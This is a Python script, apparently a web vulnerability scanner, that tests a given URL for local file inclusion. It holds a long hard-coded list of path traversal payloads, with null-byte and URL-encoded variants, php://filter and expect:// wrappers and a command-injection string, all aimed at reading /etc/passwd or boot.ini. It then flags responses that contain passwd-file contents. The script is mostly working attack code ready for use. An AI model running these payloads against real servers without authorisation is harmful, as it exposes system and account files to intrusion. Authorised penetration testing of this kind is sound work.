import requests
import sys
import re
from bs4 import BeautifulSoup

# Payloads...
local_file_inclusion = [       
        "../../../../../../../../../../../etc/passwd",      
        "/etc/passwd%2500", "/etc/passwd%00", "/etc/passwd", "///etc///passwd%2500", "///etc///passwd%00", "///etc///passwd", "../etc/passwd%2500", "../etc/passwd%00", "../etc/passwd", "..///etc///passwd%2500", "..///etc///passwd%00", "..///etc///passwd", "..///..///etc///passwd%2500", "..///..///etc///passwd%00", "..///..///etc///passwd", "..///..///..///etc///passwd%2500", "..///..///..///etc///passwd%00", "..///..///..///etc///passwd", "..///..///..///..///etc///passwd%2500", "..///..///..///..///etc///passwd%00", "..///..///..///..///etc///passwd", "..///..///..///..///..///etc///passwd%2500", "..///..///..///..///..///etc///passwd%00", "..///..///..///..///..///etc///passwd", "..///..///..///..///..///..///etc///passwd%2500", "..///..///..///..///..///..///etc///passwd%00", "..///..///..///..///..///..///etc///passwd", "..///..///..///..///..///..///..///etc///passwd%2500", "..///..///..///..///..///..///..///etc///passwd%00", "..///..///..///..///..///..///..///etc///passwd", "../../etc/passwd%2500", "../../etc/passwd%00", "../../etc/passwd", "../../../etc/passwd%2500", "../../../etc/passwd%00", "../../../etc/passwd", "../../../../etc/passwd%2500", "../../../../etc/passwd%00", "../../../../etc/passwd", "../../../../../../etc/passwd%2500", "../../../../../../etc/passwd%00", "../../../../../../etc/passwd", "../../../../../etc/passwd%00", "../../../../../etc/passwd", "../../../../../../../etc/passwd%2500", "../../../../../../../etc/passwd%00","../../../../../../../etc/passwd%00", "../../../../../../../etc/passwd", "../../../../../../../../etc/passwd%2500", "../../../../../../../../etc/passwd%00", "../../../../../../../../etc/passwd", "\etc\passwd%2500", "\etc\passwd%00", "\etc\passwd", "..\etc\passwd%2500", "..\etc\passwd%00", "..\etc\passwd", "..\..\etc\passwd%2500", "..\..\etc\passwd%00", "..\..\etc\passwd", "..\..\..\etc\passwd%2500", "..\..\..\etc\passwd%00", "..\..\..\etc\passwd", "..\..\..\..\etc\passwd%2500", "..\..\..\..\etc\passwd%00", "..\..\..\..\etc\passwd", "..\..\..\..\..\etc\passwd%2500", "..\..\..\..\..\etc\passwd%00", "..\..\..\..\..\etc\passwd", "..\..\..\..\..\..\etc\passwd%2500", "..\..\..\..\..\..\etc\passwd%00", "..\..\..\..\..\..\etc\passwd", "%00../../../../../../etc/passwd", "%00/etc/passwd%00", "%0a/bin/cat%20/etc/passwd", "/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd", "..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd", "..%2F..%2F..%2F%2F..%2F..%2Fetc/passwd", "\'/bin/cat%20/etc/passwd\'", "/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd", "/..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../etc/passwd", "/etc/default/passwd","././././././././././././etc/passwd",".//.//.//.//.//.//.//.//.//.//.//.//etc//passwd", "/./././././././././././etc/passwd", "/../../../../../../../../../../etc/passwd", "/../../../../../../../../../../etc/passwd^^", "/../../../../../../../etc/passwd", "/etc/passwd", "../../../../../../../../../../../../etc/passwd", "../../../../../../../../etc/passwd", "../../../../../../../etc/passwd", "../../../../../../etc/passwd", "../../../../../etc/passwd","../../../../etc/passwd" , "../../../etc/passwd" , "../../etc/passwd" , "../etc/passwd", "../../../../../../../../../../../etc/passwd" , ".\./.\./.\./.\./.\./.\./etc/passwd","\..\..\..\..\..\..\..\..\etc\passwd","etc/passwd", "/etc/passwd%00", "../../../../../../../../../../../../etc/passwd%00","../../../../../../../../../../../etc/passwd%00", "../../../../../../../../../../etc/passwd%00", "../../../../../../../../../etc/passwd%00", "../../../../../../../../etc/passwd%00", "../../../../../../../etc/passwd%00", "../../../../../../etc/passwd%00", "../../../../../etc/passwd%00", "../../../../etc/passwd%00", "../../../etc/passwd%00","../../etc/passwd%00", "../etc/passwd%00", "\..\..\..\..\..\..\..\..\etc\passwd%00", "..\..\..\..\..\..\..\..\..\..\etc\passwd%00", "../..\..\..\..\..\..\..\..\..\..\etc\passwd%00", "/../../../../../../../../../../../etc/passwd%00.html", "/../../../../../../../../../../../etc/passwd%00.jpg", "../../../../../../etc/passwd&=%3C%3C%3C%3C", "..2fetc2fpasswd", "..2fetc2fpasswd%00", "..2f..2fetc2fpasswd", "..2f..2fetc2fpasswd%00", "..2f..2f..2fetc2fpasswd", "..2f..2f..2fetc2fpasswd%00", "..2f..2f..2f..2fetc2fpasswd", "..2f..2f..2f..2fetc2fpasswd%00", "..2f..2f..2f..2f..2fetc2fpasswd", "..2f..2f..2f..2f..2fetc2fpasswd%00", "..2f..2f..2f..2f..2f..2fetc2fpasswd", "..2f..2f..2f..2f..2f..2fetc2fpasswd%00", "..2f..2f..2f..2f..2f..2f..2fetc2fpasswd", "..2f..2f..2f..2f..2f..2f..2fetc2fpasswd%00", "..2f..2f..2f..2f..2f..2f..2f..2fetc2fpasswd", "..2f..2f..2f..2f..2f..2f..2f..2fetc2fpasswd%00", "..2f..2f..2f..2f..2f..2f..2f..2f..2fetc2fpasswd", "..2f..2f..2f..2f..2f..2f..2f..2f..2fetc2fpasswd%00", "..2f..2f..2f..2f..2f..2f..2f..2f..2f..2fetc2fpasswd", "..2f..2f..2f..2f..2f..2f..2f..2f..2f..2fetc2fpasswd%00", "%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%255cboot.ini", "%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/boot.ini", "..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c/boot.ini", "../..\../..\../..\../..\../..\../boot.ini", "file:///etc/passwd",
        "php://filter/convert.base64-encode/resource=../../../../../etc/passwd", "expect://ls"
        ]

def local_file_inclusion_scanning(url):
    # Create a session
    session = requests.Session()
    vulnerability_found = False  # Flag to keep track of vulnerability status
    for payload in local_file_inclusion:
        main_url = url + payload
        try:
            response = session.get(main_url, verify=True)
            # print(response.text)

            if any(vulnerable_keyword in response.text for vulnerable_keyword in ["root", "www-data", "/usr/bin/zsh", "/usr/bin/bash", "0:0"]):
                #print("LFI 취약점이 존재합니다.")
                #print(main_url)
                #print("payload : ", payload)
                ### 취약점 발견 ###
                vulnerability_found = True  # Set flag to True if vulnerability is found
                LFI = {}
                LFI['success'] = 'O'  
                LFI['payload'] = payload
                LFI['vuln_url'] = main_url
                return LFI
            elif response.status_code == 200 and "root:x" in response.text:
                #print("LFI 취약점이 존재합니다.")
                ### 취약점 발견 ###
                vulnerability_found = True  # Set flag to True if vulnerability is found
                LFI = {}
                LFI['success'] = 'O'  
                LFI['payload'] = payload
                LFI['vuln_url'] = main_url
                return LFI
        except requests.RequestException as e:
            print(f"An error occurred while requesting {main_url}: {str(e)}")
            LFI = {}
            LFI['success'] = 'ERROR'  
            LFI['payload'] = '-'
            LFI['vuln_url'] = '-'
            return LFI

    if not vulnerability_found:
        # print("LFI 취약점이 존재하지 않습니다.")
        LFI = {}
        LFI['success'] = 'X'  
        LFI['payload'] = '-'
        LFI['vuln_url'] = '-'
        return LFI



if __name__ == "__main__":
    # Perform vulnerability scan
    if len(sys.argv) != 2:
        print("Please input argument")
        print("usage: python3 xss.py [url]")
    else:
        try:
            url = sys.argv[1]
            result = local_file_inclusion_scanning(url)
            print(result)
        except Exception as e:
            print("[!]Error: " + str(e))
